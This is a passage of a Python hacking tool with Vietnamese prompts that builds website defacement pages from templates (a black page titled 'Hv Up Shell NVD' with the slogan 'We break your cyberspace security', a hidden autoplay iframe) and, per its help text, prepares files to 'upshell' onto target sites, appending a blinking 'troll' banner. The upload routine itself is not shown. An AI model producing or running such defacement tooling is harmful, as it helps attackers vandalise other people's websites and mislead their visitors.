                  filedata = filedata.replace('-8-',mau2_vi_tri8) 
                  filedata = filedata.replace('-9-',mau2_vi_tri9)
                  filedata = filedata.replace('-10-',mau2_vi_tri10)
                  filedata = filedata.replace('-11-',mau2_vi_tri11)
                  filedata = filedata.replace('-12-',mau2_vi_tri12)                   
              with open(mau2_tao_moi, 'w') as file:
                  file.write(filedata)    
          if ten_mau == 'mau3':
              print('Bạn đang tạo code với mẫu 3 iuiuiui')
              mau3_tao_moi = input('nhập tên file(phải có .html ở cuối) :')
              mau3_vi_tri1 = input("Nhập chữ vị trí 1 :")
              mau3_vi_tri2 = input("Nhập chữ vị trí 2 :")
              mau3 = '''
              <!DOCTYPE HTML>

          <html>

          <head>

          <title>Hv Up Shell NVD</title>

          <meta property="og:image" content="https://i.imgur.com/VDvkPjI.png">

          <meta name="title" content="Ax Carax Feat Rayx">

          <meta name="description" content="We break your cyberspace security">

          <body allign="center" bgcolor="black">

          <link rel="preconnect" href="https://fonts.gstatic.com">

          <link rel="preconnect" href="https://fonts.gstatic.com">

          <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap" rel="stylesheet" type="text/css">

          <style> html, body{color: #FFFFFF; font-family:'Ubuntu Mono',sans-serif;font-weight: 60;height: 60vh;margin: 0; }



          .full-height {height: 67vh; }

          .flex-center { align-items: center;display: flex;justify-content: center; }

          .position-ref { position: relative; }

          .content {text-align: center;}

          .title {font-size: 36px;padding: 20px;}



          input { background: transparent;color: black;border: 1px solid black;}



          input:hover{color:black;}



          </style>

          <br>

          <br>

          <br>

          <center><img src="https://i.pinimg.com/originals/34/13/36/341336d4cdc6d0005806b7694ffdb98d.gif" height="400" width="700"><center>

          <br>

          <i><center><font color="white" size="4.5">-1-<br></i>
          <br><center><font color="red" size="4"><i>"-2-"</i><br>
          <br>
          <center><font color="white" size="3">Copyright | &copy Vduc006</center>

          <iframe width="0" height="0" src="https://www.youtube.com/embed/J_Z7mH3n47k?autoplay=true" frameborder="0" allow="autoplay;"></iframe>
              '''
              mau3_file_moi = open(mau3_tao_moi,'x')
              mau3_file_moi.write(mau3)
              mau3_file_moi.close()
              with open(mau3_tao_moi, 'r') as file :
                  filedata = file.read()
                  filedata = filedata.replace('-1-',mau3_vi_tri1)
                  filedata = filedata.replace('-2-',mau3_vi_tri2)

              with open(mau3_tao_moi, 'w') as file:
                  file.write(filedata)
          if ten_mau == 'mau4':
              print('Bạn đang tạo code với mẫu 4 <3')
              mau2_tao_moi = input('nhập tên file(phải có .html ở cuối) :')
              mau2_vi_tri1 = input("Nhập chữ vị trí 1 :")
              mau2_vi_tri2 = input("Nhập chữ vị trí 2 :")
              mau2_vi_tri3 = input("Nhập chữ vị trí 3 :")
              mau2_vi_tri4 = input("Nhập chữ vị trí 4 :")
              mau2_vi_tri5 = input("Nhập chữ vị trí 5 :")   
              print('van dg pt them')
          # https://haxor.my.id/  
         if a == 'hdsd':
          print('''
          - Bạn hãy nhập tên file chứa code bạn muốn upshell
          - Nếu bạn chưa có file code hoặc mẫu hãy nhập: taomau khi tool yêu cầu nhập tên file :v
          - Đối với tool tạo mẫu này :
              +] Bạn cần có hướng dẫn trong ảnh mà tôi gửi 
              +] Việc biết vị trí giúp bạn có thể dễ dàng làm ra 1 file code ưng ý
          - Tuyệt đối không được sửa banner, các thứ trong tool, nếu không muốn bị ban ahihi
          tool by vduc006 cảm ơn bạn đã dùng
          Donate me: 0373871213 Mb bank
          ''')
          sys.exit()
         
          
            
        
         f = open(a,'a')
         hehe = '''
            <h1 class='troll'>hoc vien lam tro meo cua vduc</h1>
            <style>
                .troll {
                    font-family: sans-serif;
                    animation-name: color-troll;
                    animation: color-troll 1s infinite;
                    
                }
                @keyframes color-troll {
              0% {
                color: black;
              }
              25% {
                color: transparent;
              }
              50% {
                color: black;
              }
              75% {
                color: transparent;
              }
              100% {
                color: black;
              }
            }
            </style>'''
         f.write(hehe)
         f.close()
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))

            continue
         else:
            
            break
            
      except KeyboardInterrupt:
         print; exit()
   
   aox(a)


if __name__ == "__main__":
    main(banner)
'))